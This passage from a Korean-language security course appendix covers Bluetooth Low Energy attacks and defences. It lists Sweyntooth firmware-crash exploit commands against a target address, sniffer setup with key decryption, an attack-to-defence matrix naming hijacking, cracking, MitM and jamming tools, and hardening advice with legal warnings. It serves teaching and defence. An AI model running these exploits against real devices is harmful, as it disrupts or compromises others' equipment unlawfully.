# 4. LESC 강제 (방어)
sudo bluetoothctl
[bluetooth]> menu pair
[pair]> ssp-debug-mode false
```

#### 도구 6: Sweyntooth — BLE 펌웨어 fuzz (s11)

```bash
cd /tmp/sweyntooth && ./setup.sh

# 12 attack 실행
python3 link_layer_length_overflow.py /dev/ttyACM0 AA:BB:CC:11:22:33
python3 truncated_l2cap.py /dev/ttyACM0 AA:BB:CC:11:22:33
python3 silent_length_overflow.py /dev/ttyACM0 AA:BB:CC:11:22:33
python3 public_key_crash.py /dev/ttyACM0 AA:BB:CC:11:22:33
python3 invalid_lcap_fragment.py /dev/ttyACM0 AA:BB:CC:11:22:33
python3 key_size_overflow.py /dev/ttyACM0 AA:BB:CC:11:22:33

# CVE-2019-19193 (TI BLE-Stack)
# CVE-2019-17061 (Cypress)
# 등 12개
```

#### 도구 7: nRF52840 Sniffer + Wireshark (s13)

```bash
# 1. dongle 펌웨어 flash (USB → nRF Connect Programmer)

# 2. Wireshark plugin
sudo cp /tmp/nrf-sniffer/extcap/nrf_sniffer_ble.* \
   /usr/lib/x86_64-linux-gnu/wireshark/extcap/

# 3. Wireshark
sudo wireshark
# Capture → nRF Sniffer for Bluetooth LE
# Channels: 37, 38, 39

# 4. key 입력 시 decrypt
# Edit → Preferences → Protocols → BTLE
# Key: <LTK 값 hex>
```

### BLE 공격 → 방어 매트릭스

| 공격 | 1차 도구 | 방어 |
|------|----------|------|
| GATT enum (anonymous) | bluepy / nRF Connect | GATT 인증 (require_pair) |
| BLE Just Works pair | (페어링 후 sniff) | LESC 강제 (4.2+) |
| LE Legacy TK crack | crackle + Ubertooth pcap | LESC ECDH only |
| BLE replay | btlejack hijack | 매 패킷 nonce + counter |
| BLE 광고 스푸핑 | btmgmt advertise / bleno | resolvable random address |
| BLE MitM | gattacker / mirage | LESC + numeric comparison |
| BLE jamming | btlejack -j / hackrf_transfer | adaptive freq + retry |
| BLE 펌웨어 fuzz | Sweyntooth | chip vendor patch + 펌웨어 update |
| iBeacon 변조 | bleno + custom UUID | proximity 표준 (서명 부재 한계) |
| BLE Mesh hijack | (Mesh provisioning sniff) | OOB provisioning + ECDHE |

### BLE 5.x 보안 매트릭스

| 보안 모드 | 인증 | 암호화 | 안전성 | 권장 |
|-----------|------|--------|--------|------|
| Mode 1 Level 1 | None | None | ★ | 금지 |
| Mode 1 Level 2 | None | AES-CCM | ★★ | 비권장 |
| Mode 1 Level 3 (LE Legacy) | TK (4-byte) | AES-CCM | ★★★ | crackle 위험 |
| Mode 1 Level 4 (LESC) | ECDH P-256 | AES-CCM | ★★★★★ | **권장** |
| Mode 2 Level 1 | None | Data Signing | ★★ | 비권장 |
| Mode 2 Level 2 | Authenticated | Data Signing | ★★★ | 사용 가능 |

### 학생 자가 점검 체크리스트

- [ ] hciconfig + bluetoothctl + btmgmt 3 도구 차이 답변 가능
- [ ] bluepy 로 GATT 전체 enum (service / char / descriptor) 1회
- [ ] nRF Connect Desktop GUI 로 BLE 디바이스 시각 분석 1회
- [ ] btlejack micro:bit + scan 1회 (또는 시뮬레이션)
- [ ] crackle 으로 캡처된 LE Legacy pairing 의 TK 추출 1회 (테스트 pcap)
- [ ] gattacker 또는 mirage 로 BLE MitM lab 1회
- [ ] Sweyntooth 의 12 attack 중 1개 시뮬 실행 1회
- [ ] BLE Mode 1 Level 1-4 + Mode 2 의 차이 답변 가능
- [ ] LE Legacy vs LESC 의 *왜* LESC 가 안전한지 ECDH 측면 답변
- [ ] 본 부록 모든 RF 명령에 대해 "외부 BLE 적용 시 위반 법조항" 답변

### 운영 환경 적용 시 주의

1. **LESC 강제** — bluez 5.65+ 의 LESC 만 허용 모드. LE Legacy pairing
   자동 거부. 신규 BLE 도입 의무.
2. **resolvable random address** — 운영 BLE 광고는 *resolvable random*
   (IRK 기반). public address 추적 가능.
3. **GATT 인증** — characteristic 의 read/write 권한 *require_authentication*
   설정. anonymous read 금지.
4. **BLE Mesh provisioning** — OOB (Out-of-Band) 인증 필수. UUID-based
   provisioning 만 사용 시 hijack 위험.
5. **iBeacon 한계** — iBeacon 자체는 *서명 없음* — proximity 보장만, 인증
   불가. proximity-based action 시 추가 인증 필수.
6. **Sweyntooth 적용** — BLE chip 벤더 (TI / NXP / Cypress / Telink) 의
   펌웨어 패치 확인. 미패치 chip 운영 금지.
7. **격리 lab** — gattacker / mirage / btlejack hijack 모두 lab 한정.
   외부 BLE device 한 packet 도 송신 시 전파법 §29 + 통신비밀보호법.

> 본 부록은 *학습 시연용 OSS 시퀀스* 이다. 모든 BLE 공격은 *허가된 lab*
> 또는 *본인 device* 한정. 외부 BLE 청취/송신 시 형사 처벌 대상.

---
